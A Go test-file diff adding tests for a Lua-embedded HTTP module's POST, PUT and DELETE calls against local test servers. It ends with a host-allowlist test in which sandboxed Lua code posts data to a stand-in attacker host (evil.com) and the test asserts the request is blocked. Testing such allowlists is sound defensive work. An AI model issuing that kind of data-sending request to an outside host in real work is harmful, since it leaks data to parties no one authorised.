@@ -1,6 +1,7 @@
 package modules
 
 import (
+	"io"
 	"net/http"
 	"net/http/httptest"
 	"strings"
@@ -379,4 +380,166 @@ return resp.status_code, resp.body, resp.headers["Content-Type"], resp.headers["
 	assert.Equal(t, `{"message": "created"}`, body)
 	assert.Equal(t, "application/json", contentType)
 	assert.Equal(t, "custom-value", customHeader)
+}
+
+func TestHTTPModule_Post(t *testing.T) {
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		assert.Equal(t, "POST", r.Method)
+		body, _ := io.ReadAll(r.Body)
+		ct := r.Header.Get("Content-Type")
+		w.WriteHeader(http.StatusCreated)
+		w.Write([]byte(`{"method":"POST","body":"` + string(body) + `","ct":"` + ct + `"}`))
+	}))
+	defer server.Close()
+
+	hm := NewHTTPModule(HTTPConfig{
+		Timeout:         5 * time.Second,
+		GlobalAllowlist: []string{"*"},
+	})
+
+	L := lua.NewState()
+	defer L.Close()
+	hm.LoadHTTP(L, "test")
+
+	code := `
+local http = require("http")
+local resp = http.post("` + server.URL + `/api", '{"key":"val"}', {["Content-Type"] = "application/json"})
+return resp.status_code, resp.body
+`
+	err := L.DoString(code)
+	require.NoError(t, err)
+
+	body := L.Get(-1).String()
+	statusCode := L.Get(-2).String()
+	L.Pop(2)
+
+	assert.Equal(t, "201", statusCode)
+	assert.Contains(t, body, `"method":"POST"`)
+	assert.Contains(t, body, `"body":"{"key":"val"}"`)
+	assert.Contains(t, body, `"ct":"application/json"`)
+}
+
+func TestHTTPModule_Put(t *testing.T) {
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		assert.Equal(t, "PUT", r.Method)
+		body, _ := io.ReadAll(r.Body)
+		w.WriteHeader(http.StatusOK)
+		w.Write(body)
+	}))
+	defer server.Close()
+
+	hm := NewHTTPModule(HTTPConfig{
+		Timeout:         5 * time.Second,
+		GlobalAllowlist: []string{"*"},
+	})
+
+	L := lua.NewState()
+	defer L.Close()
+	hm.LoadHTTP(L, "test")
+
+	code := `
+local http = require("http")
+local resp = http.put("` + server.URL + `", "updated")
+return resp.status_code, resp.body
+`
+	err := L.DoString(code)
+	require.NoError(t, err)
+
+	body := L.Get(-1).String()
+	statusCode := L.Get(-2).String()
+	L.Pop(2)
+
+	assert.Equal(t, "200", statusCode)
+	assert.Equal(t, "updated", body)
+}
+
+func TestHTTPModule_Delete(t *testing.T) {
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		assert.Equal(t, "DELETE", r.Method)
+		w.WriteHeader(http.StatusNoContent)
+	}))
+	defer server.Close()
+
+	hm := NewHTTPModule(HTTPConfig{
+		Timeout:         5 * time.Second,
+		GlobalAllowlist: []string{"*"},
+	})
+
+	L := lua.NewState()
+	defer L.Close()
+	hm.LoadHTTP(L, "test")
+
+	// DELETE with no body
+	code := `
+local http = require("http")
+local resp = http.delete("` + server.URL + `/resource/1")
+return resp.status_code
+`
+	err := L.DoString(code)
+	require.NoError(t, err)
+
+	statusCode := L.Get(-1).String()
+	L.Pop(1)
+
+	assert.Equal(t, "204", statusCode)
+}
+
+func TestHTTPModule_DeleteWithBody(t *testing.T) {
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		assert.Equal(t, "DELETE", r.Method)
+		body, _ := io.ReadAll(r.Body)
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte(`{"deleted":"` + string(body) + `"}`))
+	}))
+	defer server.Close()
+
+	hm := NewHTTPModule(HTTPConfig{
+		Timeout:         5 * time.Second,
+		GlobalAllowlist: []string{"*"},
+	})
+
+	L := lua.NewState()
+	defer L.Close()
+	hm.LoadHTTP(L, "test")
+
+	code := `
+local http = require("http")
+local resp = http.delete("` + server.URL + `/resource", '{"id":42}', {["Content-Type"] = "application/json"})
+return resp.status_code, resp.body
+`
+	err := L.DoString(code)
+	require.NoError(t, err)
+
+	body := L.Get(-1).String()
+	statusCode := L.Get(-2).String()
+	L.Pop(2)
+
+	assert.Equal(t, "200", statusCode)
+	assert.Contains(t, body, `{"id":42}`)
+}
+
+func TestHTTPModule_PostHostValidation(t *testing.T) {
+	hm := NewHTTPModule(HTTPConfig{
+		Timeout:         5 * time.Second,
+		GlobalAllowlist: []string{"api.example.com"},
+	})
+
+	L := lua.NewState()
+	defer L.Close()
+	hm.LoadHTTP(L, "test")
+
+	code := `
+local http = require("http")
+local resp, err = http.post("https://evil.com/api", "data")
+return resp, err
+`
+	err := L.DoString(code)
+	require.NoError(t, err)
+
+	errMsg := L.Get(-1)
+	result := L.Get(-2)
+	L.Pop(2)
+
+	assert.Equal(t, lua.LNil, result)
+	assert.Contains(t, errMsg.String(), "host validation failed")
 }
